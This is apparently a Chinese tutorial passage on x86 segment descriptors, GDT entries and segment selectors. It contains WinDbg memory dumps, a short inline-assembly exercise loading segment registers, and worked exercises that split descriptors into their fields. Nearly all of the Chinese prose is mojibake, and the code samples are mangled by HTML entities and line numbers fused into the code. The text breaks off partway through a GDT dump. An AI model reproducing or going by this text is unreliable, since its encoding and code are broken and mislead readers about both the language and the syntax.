Base;//32ä½Baseã€‚æ®µæè¿°ç¬¦çš„3ä¸ªBaseæ‹¼æ¥è€Œæˆï¼Œé«˜å­—èŠ‚31:24æ‹¼æ¥7:0æ‹¼æ¥ä½å­—èŠ‚31:16ã€‚ DWORD Limit;//32ä½Limitã€‚æ®µæè¿°ç¬¦çš„2ä¸ªSegLimitæ‹¼æ¥è€Œæˆï¼Œé«˜å­—èŠ‚19:16æ‹¼æ¥ä½å­—èŠ‚16:0ï¼Œå½“Gä½ä¸º0æ—¶ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œé«˜ä½è¡¥3ä¸ª0ã€‚Gä½ä¸º1æ—¶ï¼Œä½ä½è¡¥FFFã€‚&#125; å›¾ç‰‡æ¥æºï¼šã€2021.03.12ã€‘æ®µæè¿°ç¬¦å±æ€§ï¼šPä½ã€Gä½ åŠ è½½æ®µæè¿°ç¬¦è‡³æ®µå¯„å­˜å™¨ åŠ è½½æ®µæè¿°ç¬¦è‡³æ®µå¯„å­˜å™¨çš„æŒ‡ä»¤å…±æœ‰ä¸‰ç§ï¼š ä½¿ç”¨movæŒ‡ä»¤ 1mov ss,ax ä½¿ç”¨LESã€LSSã€LDSã€LFSã€LGSæŒ‡ä»¤ä¿®æ”¹å¯¹åº”çš„å¯„å­˜å™¨ CSä¸èƒ½é€šè¿‡ä¸Šè¿°æŒ‡ä»¤è¿›è¡Œä¿®æ”¹ã€‚CSä¸ºä»£ç æ®µï¼ŒCSçš„æ”¹å˜ä¼šå¯¼è‡´EIPçš„æ”¹å˜ï¼Œè¦æ”¹CSï¼Œå¿…é¡»è¦ä¿è¯CSä¸EIPåŒæ—¶æ”¹ï¼Œåæ–‡ä¼šè®²è§£å¦‚ä½•ä¿®æ”¹CSå¹¶åœ¨éœ€è¦æ—¶æå‡æƒé™ã€‚ å­¦ä¹ é¡ºåº Baseï¼ŒLimit Pä½ã€Gä½ Pä½å¦‚æœä¸º1ï¼Œåˆ™æœ‰æ•ˆï¼Œçœ‹Sä½ï¼Œåˆ†ä»£ç æ®µæˆ–æ•°æ®æ®µï¼Œè¿˜æ˜¯ç³»ç»Ÿæ®µ åœ¨å­¦TYPEåŸŸï¼Œåˆ†æ®µå±æ€§ å­¦DBä½ å­¦DPL æ®µæè¿°ç¬¦å„flags and fieldsä»‹ç» P (segment-present) flag ä¸º1æ—¶ï¼Œè¡¨ç¤ºè¯¥æ®µæè¿°ç¬¦æœ‰æ•ˆã€‚ ä¸º0æ—¶ï¼Œè¡¨ç¤ºè¯¥æ®µæè¿°ç¬¦æ— æ•ˆã€‚ å½“æè¿°ç¬¦æ— æ•ˆæ—¶ï¼Œä»»ä½•å°è¯•åŠ è½½è¯¥æè¿°ç¬¦ã€è®¿é—®è¯¥æè¿°ç¬¦å¯¹åº”çš„æ®µé—´åœ°å€éƒ½ä¼šæŠ¥é”™ã€‚ Segment limit field Specifies the size of the segment. The processor puts together the two segment limit fields to form a 20-bit value. The processor interprets the segment limit in one of two ways, depending on the setting of the G (granularity) flag: â€¢ If the granularity flag is clear, the segment size can range from 1 byte to 1 MByte, in byte increments.G=0ï¼Œé«˜ä½è¡¥000 â€¢ If the granularity flag is set, the segment size can range from 4 KBytes to 4 GBytes, in 4-KByte increments.G=1ï¼Œä½ä½è¡¥FFF G (granularity) flag æ®µå¯¹é½ç²’åº¦ã€‚ ä¹Ÿå°±æ˜¯å†³å®šäº†Limitå¤§å°çš„ä¸€ä¸ªä½ã€‚ åœ¨ä¸Šæ–‡å¡«å……æ®µå¯„å­˜å™¨éšè—éƒ¨åˆ†ï¼ˆCè¯­è¨€ç»“æ„ä½“ï¼‰æ—¶ï¼ŒLimitåœ¨æ®µæè¿°ç¬¦ä¸­åªæœ‰5ä¸ª16è¿›åˆ¶ä½ï¼Œè€Œç»“æ„ä½“ä¸­Limitæ˜¯32ä½ï¼Œå‰©ä¸‹çš„3ä¸ª16è¿›åˆ¶ä½ç”±çœ‹Gä½å†³å®šã€‚ å½“Gä¸º0æ—¶ï¼Œæ•´ä¸ªæ®µå°†ä»¥å­—èŠ‚å¯¹é½ï¼ŒLimitå¤§å°å•ä½ä¸ºå­—èŠ‚ï¼Œæ‰€ä»¥ç²¾ç¡®åˆ°1ã€‚Limitç›´æ¥å°±æ˜¯æ®µé•¿ã€‚æ®µå¯„å­˜å™¨ä¸­çš„Limité«˜ä½è¡¥0ã€‚ å½“Gä¸º1æ—¶ï¼Œæ•´ä¸ªæ®µå°†ä»¥4KBå¯¹é½ï¼ŒLimitå¤§å°å•ä½ä¸º4KBã€‚4KB=4096Dï¼Œï¼ˆ4096ä¸ªï¼Œåœ°å€è®¡ç®—è¦å‡1ï¼‰ï¼Œå°±æ˜¯4095D=FFFï¼Œæ‰€ä»¥æ®µçš„æœ«å°¾å¤„ä¸€å®šæ˜¯ä»¥FFFç»“å°¾ã€‚æ®µå¯„å­˜å™¨ä¸­çš„Limitä½ä½è¡¥FFFã€‚ï¼Ÿ å¦‚æœG = 0ï¼Œè¯´æ˜æ®µæè¿°ç¬¦ä¸­çš„Limitçš„å•ä½æ˜¯å­—èŠ‚ï¼Œæ®µé•¿åº¦LimitèŒƒå›´å¯ä»1Bï½1MBï¼Œå³åœ¨20ä½çš„å‰é¢è¡¥3ä¸ª0å³å¯ï¼›å¦‚æœG = 1ï¼Œè¯´æ˜æ®µæè¿°ç¬¦ä¸­çš„Limitçš„å•ä½æ˜¯å­—èŠ‚ä¸º4KBï¼Œå³æ®µé•¿åº¦LimitèŒƒå›´å¯ä»4KBï½4GBï¼Œåœ¨20ä½çš„åé¢è¡¥å……FFFå³å¯ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœLimitæ‹¼æ¥åçš„ä¸ºFFFFFï¼Œå¦‚æœGä¸º0åˆ™ä¸º000FFFFFï¼Œå¦‚æœGä¸º1åˆ™ä¸ºFFFFFFFã€‚ å½“G=0æ—¶ï¼ŒLimitçš„èŒƒå›´æ˜¯0x00000000-0x000FFFFFï¼Œå…¶ä¸­ï¼Œæ®µæè¿°ç¬¦çš„20ä½åœ¨ä½ä½ï¼Œé«˜ä½è¡¥0. å½“G=1æ—¶ï¼ŒLimitçš„èŒƒå›´æ˜¯0x00000FFF-0xFFFFFFFFï¼Œå…¶ä¸­ï¼Œæ®µæè¿°ç¬¦çš„20ä½åœ¨é«˜ä½ï¼Œä½ä½è¡¥Fã€‚ å‚è€ƒï¼šï¼ˆ4ï¼‰æ®µæè¿°ç¬¦P,Gä½ S (descriptor type) flag S = 1ï¼Œä»£ç æ®µæˆ–è€…æ•°æ®æ®µæè¿°ç¬¦ï¼Œ S = 0ï¼Œç³»ç»Ÿæ®µæè¿°ç¬¦ã€‚ å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªæ®µæè¿°ç¬¦æ˜¯å¦æ˜¯ä»£ç æ®µæˆ–æ•°æ®æ®µï¼šçœ‹é«˜å­—èŠ‚çš„15~12ä½ï¼Œç¬¬4ä¸ªåå…­è¿›åˆ¶æ•°ã€‚ DPLåªæœ‰ä¸¤ç§å¯èƒ½ï¼šå…¨ä¸º0ï¼Œæˆ–å…¨ä¸º1ã€‚ På¿…é¡»=1ï¼Œè¡¨ç¤ºè¿™ä¸ªæ®µæè¿°ç¬¦æœ‰æ•ˆã€‚ S=1ï¼Œè¡¨ç¤ºæ˜¯ä»£ç æ®µæˆ–æ•°æ®æ®µã€‚ æ‰€ä»¥å¯èƒ½çš„æƒ…å†µåªæœ‰ï¼š1001,1111ã€‚9å’Œf çœ‹GDTè¡¨æ—¶ï¼Œçœ‹é«˜å­—èŠ‚çš„ç¬¬4ä¸ªåå…­è¿›åˆ¶æ•°ï¼Œæ˜¯9æˆ–fï¼Œå°±æ˜¯ä»£ç æ®µæˆ–æ•°æ®æ®µã€‚ Type field S=1 å½“S=1æ—¶ã€‚è¡¨ç¤ºè¯¥æ®µæ˜¯ä»£ç æ®µæˆ–æ•°æ®æ®µã€‚ æ¥ç€çœ‹TYPEåŸŸçš„ç¬¬11ä½ï¼Œç¬¬11ä½ä¸º1ï¼Œè¡¨ç¤ºä»£ç æ®µã€‚ç¬¬11ä½ä¸º0ï¼Œè¡¨ç¤ºæ•°æ®æ®µã€‚ åå…­è¿›åˆ¶ï¼œ8ï¼Œæ•°æ®æ®µã€‚åå…­è¿›åˆ¶â‰¥8ï¼Œä»£ç æ®µã€‚ ä¸¾ä¸ªä¾‹å­ï¼š 00cf9300`0000ffffï¼Œä»å·¦å¾€å³ç¬¬5ä¸ªæ•°å­—æ˜¯9ï¼Œæ‰€ä»¥æ˜¯ä»£ç æ®µæˆ–æ•°æ®æ®µã€‚ä»å·¦å¾€å³ç¬¬6ä¸ªæ•°å­—æ˜¯3ï¼Œå°äº8ï¼Œæ‰€ä»¥æ˜¯æ•°æ®æ®µã€‚ 00cf9b00`0000ffffï¼Œä»å·¦å¾€å³ç¬¬5ä¸ªæ•°å­—æ˜¯9ï¼Œæ‰€ä»¥æ˜¯ä»£ç æ®µæˆ–æ•°æ®æ®µã€‚ä»å·¦å¾€å³ç¬¬6ä¸ªæ•°å­—æ˜¯bï¼Œâ‰¥8ï¼Œæ‰€ä»¥æ˜¯ä»£ç æ®µã€‚ å½“Sä½=1ï¼ŒTYPEåŸŸ11ä½ä¸º0ï¼Œæ•°æ®æ®µï¼š å±æ€§ å«ä¹‰ ä¸º1 ä¸º0 å¤‡æ³¨ A è®¿é—®ä½ã€‚æ•°æ®æ®µæ˜¯å¦è¢«è®¿é—®è¿‡ã€‚ è®¿é—®è¿‡ï¼Œaccessed æœªè®¿é—®è¿‡ æ“ä½œç³»ç»Ÿåˆšå¯åŠ¨ï¼Œæ®µæè¿°ç¬¦æ˜¯æ²¡æœ‰è¢«åŠ è½½è¿‡çš„ï¼Œæ‰€ä»¥Aä½ä¸€å®šæ˜¯0 W å¯å†™ä½ã€‚æ•°æ®æ®µæ˜¯å¦å¯å†™ã€‚ å¯å†™ ä¸å¯å†™ E å‘ä¸‹æ‹“å±•ä½ã€‚ expand-down expand-up fs.baseè¡¨ç¤ºæ®µçš„èµ·å§‹åœ°å€ï¼ŒLimitæ˜¯æ®µé•¿ã€‚ å‘ä¸Šæ‹“å±•ï¼ˆå·¦ï¼‰ï¼Œè¡¨ç¤ºæœ‰æ•ˆåŒºåŸŸæ˜¯fs.baseåˆ°fs.base+Limitä¹‹é—´çš„åŒºåŸŸï¼Œå…¶ä½™åŒºåŸŸæ— æ•ˆã€‚ å‘ä¸‹æ‹“å±•ï¼ˆå³ï¼‰ï¼Œè¡¨ç¤ºæ— æ•ˆåŒºåŸŸæ˜¯fs.baseåˆ°fs.base+Limitä¹‹é—´çš„åŒºåŸŸï¼Œå…¶ä½™åŒºåŸŸæœ‰æ•ˆã€‚ å½“Sä½=1ï¼ŒTYPEåŸŸæ§11ä½ä¸º1ï¼Œä»£ç æ®µï¼š å±æ€§ å«ä¹‰ ä¸º1 ä¸º0 å¤‡æ³¨ A è®¿é—®ä½ã€‚æ•°æ®æ®µæ˜¯å¦è¢«è®¿é—®è¿‡ã€‚ è®¿é—®è¿‡ï¼Œaccessed æœªè®¿é—®è¿‡ æ“ä½œç³»ç»Ÿåˆšå¯åŠ¨ï¼Œæ®µæè¿°ç¬¦æ˜¯æ²¡æœ‰è¢«åŠ è½½è¿‡çš„ï¼Œæ‰€ä»¥Aä½ä¸€å®šæ˜¯0 R å¯è¯»ä½ å¯è¯» ä¸å¯è¯» C ä¸€è‡´ä½ ä¸€è‡´ä»£ç æ®µ éä¸€è‡´ä»£ç æ®µ ä»£ç æ®µéƒ½æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼ŒExecute The accessed bit indicates whether the segment has been accessed since the last time the operating-system or executive cleared the bit. The processor sets this bit whenever it loads a segment selector for the segment into a segment register, assuming that the type of memory that contains the segment descriptor supports processor writes. The bit remains set until explicitly cleared. This bit can be used both for virtual memory management and for debugging è®¿é—®ä½ï¼ˆAccessed bitï¼‰è¡¨ç¤ºè‡ªæ“ä½œç³»ç»Ÿæˆ–æ‰§è¡Œä½“ä¸Šæ¬¡æ¸…é™¤æ­¤ä½ä»¥æ¥ï¼Œæ®µæ˜¯å¦å·²è¢«è®¿é—®ã€‚åªè¦å°†æ®µé€‰æ‹©å™¨åŠ è½½åˆ°æ®µå¯„å­˜å™¨ä¸­ï¼Œå¤„ç†å™¨å°±ä¼šè®¾ç½®æ­¤ä½ï¼Œå‰ææ˜¯åŒ…å«æ®µæè¿°ç¬¦çš„å†…å­˜ç±»å‹æ”¯æŒå¤„ç†å™¨å†™å…¥ã€‚æ­¤ä½ä¿æŒè®¾ç½®çŠ¶æ€ï¼Œç›´åˆ°è¢«æ˜ç¡®æ¸…é™¤ã€‚è¯¥ä½æ—¢å¯ä»¥ç”¨äºè™šæ‹Ÿå†…å­˜ç®¡ç†ï¼Œä¹Ÿå¯ä»¥ç”¨äºè°ƒè¯•ã€‚ S=0 å½“S=0æ—¶ã€‚è¯¥æ®µä¸ºç³»ç»Ÿæè¿°ç¬¦ã€‚ç³»ç»Ÿæè¿°ç¬¦åˆ†ä¸ºå¦‚ä¸‹ç±»å‹ï¼š D/B (default operation size/default stack pointer size and/or upper bound) flag æ®µæè¿°ç¬¦åŠ è½½åˆ°ä¸åŒçš„æ®µå¯„å­˜å™¨ï¼ŒDBä½å¯¹ä¸åŒæ®µçš„å½±å“æ˜¯ä¸åŒçš„ï¼Œæƒ…å†µå¦‚ä¸‹ï¼š å¯¹CSæ®µçš„å½±å“ï¼ˆExecutable code segmentï¼‰ Dçš„å€¼ æƒ…å†µ 1 é‡‡ç”¨32ä½å¯»å€æ–¹å¼ 0 é‡‡ç”¨16ä½å¯»å€æ–¹å¼ å¯¹SSæ®µçš„å½±å“ï¼ˆStack segment (data segment pointed to by the SS register)ï¼‰ Dçš„å€¼ æƒ…å†µ 1 éšå¼å †æ ˆè®¿é—®æŒ‡ä»¤ï¼ˆå¦‚ï¼šPUSH POP CALLï¼‰ä½¿ç”¨32ä½å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ESP 0 éšå¼å †æ ˆè®¿é—®æŒ‡ä»¤ï¼ˆå¦‚ï¼šPUSH POP CALLï¼‰ä½¿ç”¨16ä½å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨SP éšå¼å †æ ˆè®¿é—®æŒ‡ä»¤ï¼šè¿™äº›æŒ‡ä»¤ä½¿ç”¨æ—¶éƒ½è¦æ”¹å˜å †æ ˆçš„å€¼ å‘ä¸‹æ‹“å±•çš„æ•°æ®æ®µï¼ˆExpand-down data segment.ï¼‰ Dçš„å€¼ æƒ…å†µ 1 æ®µä¸Šé™ä¸º4GB 0 æ®µä¸Šé™ä¸º64KB The flag is called the B flag and it specifies the upper bound of the segment. If the flag is set, the upper bound is FFFFFFFFH (4 GBytes); if the flag is clear, the upper bound is FFFFH (64 KBytes) çº¢è‰²è¡¨ç¤ºå‘ä¸‹æ‹“å±•èƒ½å¯»å€çš„èŒƒå›´ã€‚å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœD = 0ï¼Œæœ€å¤§å¯»å€èŒƒå›´å˜æˆäº†64KBã€‚ AVLï¼ˆAvailable and reserved bitsï¼‰ AVLæŒ‡ç¤ºæ˜¯å¦å¯ä¾›ç³»ç»Ÿè½¯ä»¶ä½¿ç”¨ï¼Œç”±æ“ä½œç³»ç»Ÿæ¥ä½¿ç”¨ï¼ŒCPUå¹¶ä¸ä½¿ç”¨å®ƒã€‚ Bit 20 of the second doubleword of the segment descriptor is available for use by system software. ç»ƒä¹  åŠ è½½æ®µæè¿°ç¬¦è‡³æ®µå¯„å­˜å™¨ç»ƒä¹  è‡ªè¡Œé€‰ä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œè‡ªå·±æ„é€ ä¸€ä¸ªæ®µé€‰æ‹©å­ï¼Œå¹¶ç”¨å¦‚ä¸‹ä»£ç æ¨¡æ¿ä½¿ç”¨lesã€lssã€ldsã€lfsã€lgsä¿®æ”¹å¯¹åº”çš„æ®µå¯„å­˜å™¨ã€‚ 12345678char buffer[6];//è‡ªå·±æ„é€ ä¸€ä¸ªæ®µé€‰æ‹©å­//è‡ªå·±è‡ªè¡Œèµ‹å€¼ï¼Œä½ æ„é€ çš„çš„æ®µæè¿°ç¬¦ä½ç½®ä¸ä¸€æ ·ï¼Œæ®µé€‰æ‹©å­å°±ä¸ä¸€æ ·_asm&#123; les ecx,fword ptr ds:[buffer] //é«˜2ä¸ªå­—èŠ‚ç»™esï¼Œä½å››ä¸ªå­—èŠ‚ç»™ecx&#125; æ³¨æ„ï¼šRPL&lt;=DPLï¼ˆåœ¨æ•°å€¼ä¸Šï¼‰ ç­”æ¡ˆå› ä¸ºå†™çš„Cè¯­è¨€ç¨‹åºåœ¨3ç¯ï¼ŒCPLæ˜¯3ï¼Œåªèƒ½æ‰¾DPLä¸º3çš„ï¼Œè¦ä¸CPLå’ŒDPLçš„æ£€æŸ¥è¿‡ä¸å»ã€‚æˆ‘æœ¬æ¥æ‰¾ç´¢å¼•ä¸º4çš„æ®µæè¿°ç¬¦ï¼Œæ„é€ å®Œçš„æ®µé€‰æ‹©å­æ˜¯0x23ï¼Œä½†è°ƒè¯•æ—¶DSã€ESã€SSæœ¬æ¥å°±æ˜¯0x23ï¼Œçœ‹ä¸åˆ°å˜åŒ–ï¼Œå°±åˆæ¢äº†ä¸€ä¸ªæ®µæè¿°ç¬¦ã€‚å¦å¤–ï¼Œ3ç¯FSæœ¬æ¥å°±æ˜¯0x3Bã€‚æˆ‘é€‰çš„ç´¢å¼•ä¸º7çš„æ®µæè¿°ç¬¦ï¼šåºå·åœ°å€æ®µæè¿°ç¬¦æ•°æ®æ®µorä»£ç æ®µDPL78003f0380040f300`00000fffæ•°æ®æ®µ11æ„é€ æ®µé€‰æ‹©å­ï¼šç´¢å¼•ä¸º7ï¼ŒRPLä¸º11ï¼ŒæŸ¥GDTè¡¨0000 0000 0011 1 0 110000 0000 0011 1011Selectorï¼š0x3bæ³¨æ„å°ç«¯å­˜å‚¨ã€‚bufferæ•°ç»„é‡Œçš„é¡ºåº1234567891011#include &lt;stdio.h&gt;int main(void)&#123; //æ®µé€‰æ‹©å­ï¼š0000 0000 0011 1011 char buffer[6]=&#123;0xff,0xff,0xff,0xff,0x3b,0x00&#125;;//æ³¨æ„å°ç«¯åºï¼Œå‰é¢4ä¸ªå­—èŠ‚éšä¾¿å†™çš„ _asm &#123; les ecx,fword ptr ds:[buffer] //é«˜2ä¸ªå­—èŠ‚ç»™esï¼Œä½å››ä¸ªå­—èŠ‚ç»™ecx &#125; return 0;&#125;æ‰§è¡ŒlesæŒ‡ä»¤å‰æ‰§è¡ŒlesæŒ‡ä»¤ålssã€ldsã€lgsåŒç†ï¼ŒæŠŠlesæ¢ä¸€ä¸‹lfsçš„bufferç”¨ä¸‹é¢è¿™ä¸ªï¼Œæ®µé€‰æ‹©å­æ¢æˆ0x23ï¼Œå› ä¸ºå®ƒæœ¬æ¥æ˜¯0x3b1char buffer[6]=&#123;0xff,0xff,0xff,0xff,0x23,0x00&#125;; æ‹†åˆ†ç»ƒä¹  æ®µæè¿°ç¬¦æ‹†åˆ†ç»ƒä¹  ä»¥00cf9b00`0000ffffä¸ºä¾‹ï¼Œè¿›è¡Œæ‹†åˆ†ã€‚ ç­”æ¡ˆé«˜å­—èŠ‚ï¼šBase 31:24 ï¼š00Gï¼š1D/Bï¼š1Lï¼š0AVLï¼š0Seg. Limit 19:16ï¼šfPï¼š1DPLï¼š00Sï¼š1Typeï¼šbBase 23:16ï¼š00ä½å­—èŠ‚ï¼šBase Address 15:00 ï¼š0000Segment Limit 15:00ï¼šffff æ®µé€‰æ‹©å­æ‹†åˆ†ç»ƒä¹  0023ï¼Œ002Bï¼Œ0030ï¼Œ003B ç­”æ¡ˆ00230000 0000 0010 0011Indexï¼š0000 0000 0010 0.ç´¢å¼•æ˜¯4ï¼ŒæŸ¥GDTè¡¨ä¸­çš„ç¬¬5ä¸ªTIï¼š0RPLï¼š11002B0000 0000 0010 1011Indexï¼š0000 0000 0010 1TIï¼š0RPLï¼š1100300000 0000 0011 0000Indexï¼š0000 0000 0011 0TIï¼š0RPLï¼š00003B0000 0000 0011 1011Indexï¼š0000 0000 0011 1TIï¼š0RPLï¼š1100530000 0000 0101 0011Indexï¼š0000 0000 0101 0TIï¼š0RPLï¼š11 æ®µæè¿°ç¬¦å±æ€§Pä½Gä½è¯¾å ‚ç»ƒä¹  å‚è€ƒï¼šæ®µæè¿°ç¬¦å±æ€§Pä½å’ŒGä½ æŸ¥GDTè¡¨ï¼Œå¦‚ä½•å¿«é€Ÿç¡®å®šå“ªä¸ªæè¿°ç¬¦çš„Pä½ä¸º0æˆ–è€…ä¸º1 ç­”æ¡ˆçœ‹é«˜å­—èŠ‚çš„ç¬¬15ä½ã€‚é«˜å­—èŠ‚ç¬¬4ä¸ªåå…­è¿›åˆ¶æ•°æ˜¯å¦â‰¥8ï¼Œâ‰¥8ï¼ŒPä½ä¸º1ï¼Œå°äº8ï¼ŒPä½ä¸º0æ¯”å¦‚ä¸‹å›¾å·¦è¾¹ä¸€ç»„é«˜ä½ç¬¬4ä¸ªåå…­è¿›åˆ¶æ•°æ˜¯ï¼š0ï¼Œ9ï¼Œfï¼Œ9ï¼Œfï¼Œ8ï¼Œ9ï¼Œ9ï¼Œ9ï¼Œ0ï¼Œ8ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ9Pä½å°±æ˜¯ï¼š0ï¼Œ1ï¼Œ1ï¼Œ1ï¼Œ1ï¼Œ1ï¼Œ1ï¼Œ1ï¼Œ1ï¼Œ0ï¼Œ1ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ1 æŸ¥GDTè¡¨å¦‚ä½•å¿«é€Ÿç¡®å®šå“ªä¸ªæè¿°ç¬¦çš„Gä½ä¸º0æˆ–è€…ä¸º1 ç­”æ¡ˆçœ‹é«˜å­—èŠ‚çš„ç¬¬23ä½æ¯”å¦‚ä¸‹å›¾å·¦è¾¹ä¸€ç»„é«˜ä½ç¬¬6ä¸ªåå…­è¿›åˆ¶æ•°æ˜¯ï¼š0ï¼Œcï¼Œcï¼Œcï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0Gä½å°±æ˜¯ï¼š0ï¼Œ1ï¼Œ1ï¼Œ1ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0 å°†æ®µæè¿°ç¬¦å¡«å†™åˆ°æ®µå¯„å­˜å™¨ç»“æ„ä½“ä¸­(æ¯äººå¡«ä¸€ä¸ª) ä¾‹å­1ä¾‹ï¼š0x2Bä½œä¸ºæ®µé€‰æ‹©å­ã€‚0000 0000 0010 1011æ‰€ä»¥Indexï¼š0000 0000 0010 1ï¼Œåè¿›åˆ¶5TIï¼š0ï¼ŒæŸ¥GDTè¡¨RPLï¼š11ï¼Œè¯·æ±‚ç‰¹æƒçº§åˆ«ä¸º3ï¼Œæœ€å°1234kd&gt; dq 8003f000 L68003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020abç´¢å¼•ä¸º5ï¼Œ0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5æ‰€ä»¥å¯¹åº”çš„æ®µæè¿°ç¬¦æ˜¯80008b04`200020ab123456789struct SegMent&#123; //å¯è§ WORD Selector;//16ä½Selectorã€‚å°±æ˜¯æ®µé€‰æ‹©å­çš„å€¼ã€‚ //ä¸å¯è§ WORD Attributes;//16ä½Attributesã€‚ä»æ®µæè¿°ç¬¦çš„Gä½åˆ°Typeä½ã€‚ DWORD Base;//32ä½Baseã€‚æ®µæè¿°ç¬¦çš„3ä¸ªBaseæ‹¼æ¥è€Œæˆï¼Œé«˜å­—èŠ‚31:24æ‹¼æ¥7:0æ‹¼æ¥ä½å­—èŠ‚31:16ã€‚ DWORD Limit;//32ä½Limitã€‚æ®µæè¿°ç¬¦çš„2ä¸ªSegLimitæ‹¼æ¥è€Œæˆã€‚å½“Gä½ä¸º0æ—¶ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œé«˜ä½è¡¥3ä¸ª0ã€‚Gä½ä¸º1æ—¶ï¼Œä½ä½è¡¥FFFã€‚&#125;Selector=2BAttributes=008bBase=80042000Limit=000020abG=0ä¾‹å­2ä¾‹ï¼š0x23ä½œä¸ºæ®µé€‰æ‹©å­ã€‚0000 0000 0010 0011æ‰€ä»¥Indexï¼š0000 0000 0010 0ï¼Œåè¿›åˆ¶4TIï¼š0ï¼ŒæŸ¥GDTè¡¨RPLï¼š11ï¼Œè¯·æ±‚ç‰¹æƒçº§åˆ«ä¸º3ï¼Œæœ€å°1234kd&gt; dq 8003f000 L68003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020abç´¢å¼•ä¸º4ï¼Œ0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4æ‰€ä»¥å¯¹åº”çš„æ®µæè¿°ç¬¦æ˜¯00cff300`0000ffff123456789struct SegMent&#123; //å¯è§ WORD Selector;//16ä½Selectorã€‚å°±æ˜¯æ®µé€‰æ‹©å­çš„å€¼ã€‚ //ä¸å¯è§ WORD Attributes;//16ä½Attributesã€‚ä»æ®µæè¿°ç¬¦çš„Gä½åˆ°Typeä½ã€‚ DWORD Base;//32ä½Baseã€‚æ®µæè¿°ç¬¦çš„3ä¸ªBaseæ‹¼æ¥è€Œæˆï¼Œé«˜å­—èŠ‚31:24æ‹¼æ¥7:0æ‹¼æ¥ä½å­—èŠ‚31:16ã€‚ DWORD Limit;//32ä½Limitã€‚æ®µæè¿°ç¬¦çš„2ä¸ªSegLimitæ‹¼æ¥è€Œæˆã€‚å½“Gä½ä¸º0æ—¶ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œé«˜ä½è¡¥3ä¸ª0ã€‚Gä½ä¸º1æ—¶ï¼Œä½ä½è¡¥FFFã€‚&#125;Selector=23Attributes=cff3Base=00000000Limit=ffffffffä¾‹å­3ä¾‹ï¼š0x53ä½œä¸ºæ®µé€‰æ‹©å­ã€‚0000 0000 0101 0011æ‰€ä»¥Indexï¼š0000 0000 0101 0ï¼Œåè¿›åˆ¶10TIï¼š0ï¼ŒæŸ¥GDTè¡¨RPLï¼š11ï¼Œè¯·æ±‚ç‰¹æƒçº§åˆ«ä¸º3ï¼Œæœ€å°1234567kd&gt; dq 8003f000 LB8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffa00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068ç´¢å¼•ä¸º10ï¼Œç¬¬11ä¸ªæ‰€ä»¥å¯¹åº”çš„æ®µæè¿°ç¬¦æ˜¯80008954`af000068123456789struct SegMent&#123; //å¯è§ WORD Selector;//16ä½Selectorã€‚å°±æ˜¯æ®µé€‰æ‹©å­çš„å€¼ã€‚ //ä¸å¯è§ WORD Attributes;//16ä½Attributesã€‚ä»æ®µæè¿°ç¬¦çš„Gä½åˆ°Typeä½ã€‚ DWORD Base;//32ä½Baseã€‚æ®µæè¿°ç¬¦çš„3ä¸ªBaseæ‹¼æ¥è€Œæˆï¼Œé«˜å­—èŠ‚31:24æ‹¼æ¥7:0æ‹¼æ¥ä½å­—èŠ‚31:16ã€‚ DWORD Limit;//32ä½Limitã€‚æ®µæè¿°ç¬¦çš„2ä¸ªSegLimitæ‹¼æ¥è€Œæˆã€‚å½“Gä½ä¸º0æ—¶ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œé«˜ä½è¡¥3ä¸ª0ã€‚Gä½ä¸º1æ—¶ï¼Œä½ä½è¡¥FFFã€‚&#125;Selector=53Attributes=0089Base=8054af00Limit=00000068G=0 æ®µæè¿°ç¬¦å±æ€§Sä½TYPEåŸŸ æ‰¾å‡ºæ‰€æœ‰æ•°æ®æ®µï¼Œå¹¶åˆ†æè¯¥æ®µå±æ€§:åªè¯»ã€å·²è®¿é—®ã€å¯è¯»å¯å†™ã€æ‹“å±•æ–¹å‘ æ‰¾å‡ºæ‰€æœ‰ä»£ç æ®µï¼Œå¹¶åˆ†æè¯¥æ®µå±æ€§:åªæ‰§è¡Œã€å¯è¯»å¯æ‰§è¡Œã€å·²è®¿é—®ã€ä¸€è‡´ä»£ç  æ‰¾å‡ºæ‰€æœ‰ç³»ç»Ÿæ®µ,å¹¶åˆ†æå±æ€§. ç­”æ¡ˆ1234kd&gt; r gdtrgdtr=8003f000kd&gt; r gdtlgdtl=000003ffå¤§å°æ˜¯000003ffï¼Œ1023å­—èŠ‚ã€‚æ¯ä¸ªæ®µæè¿°ç¬¦8å­—èŠ‚æ€»é•¿åº¦/æ¯ä¸ªçš„é•¿åº¦=ä¸ªæ•°1024/8=128ä¸ªï¼Œ80H1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465kd&gt; dq 8003f000 L808003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffa00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 